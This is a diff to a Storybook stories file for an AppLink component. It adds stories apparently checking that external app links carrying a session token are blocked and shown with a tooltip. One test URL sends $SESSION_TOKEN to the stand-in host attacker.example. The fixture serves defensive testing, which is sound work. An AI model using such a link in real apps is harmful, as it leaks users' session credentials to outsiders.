@@ -4,10 +4,12 @@ import {
 	MockWorkspaceAgent,
 	MockWorkspaceApp,
 	MockWorkspaceProxies,
+	MockWorkspaceSubAgent,
 } from "testHelpers/entities";
 import { withGlobalSnackbar, withProxyProvider } from "testHelpers/storybook";
 import type { Meta, StoryObj } from "@storybook/react-vite";
 import { getPreferredProxy } from "contexts/ProxyContext";
+import { screen, userEvent, within } from "storybook/test";
 import { AppLink } from "./AppLink";
 
 const meta: Meta<typeof AppLink> = {
@@ -75,6 +77,29 @@ export const ExternalAppNotInstalled: Story = {
 		},
 		agent: MockWorkspaceAgent,
 	},
+};
+
+export const SessionTokenLinkBlocked: Story = {
+	args: {
+		workspace: MockWorkspace,
+		app: {
+			...MockWorkspaceApp,
+			external: true,
+			url: "vscode://coder.coder-remote/open?url=https://attacker.example&token=$SESSION_TOKEN",
+		},
+		agent: MockWorkspaceAgent,
+	},
+	play: async ({ canvasElement }) => {
+		const canvas = within(canvasElement);
+		const user = userEvent.setup({ pointerEventsCheck: 0 });
+		await user.hover(await canvas.findByText("Test App"));
+		await screen.findByRole("tooltip");
+	},
+};
+
+export const SessionTokenLinkBlockedSubAgent: Story = {
+	...SessionTokenLinkBlocked,
+	args: { ...SessionTokenLinkBlocked.args, agent: MockWorkspaceSubAgent },
 };
 
 export const SharingLevelOwner: Story = {
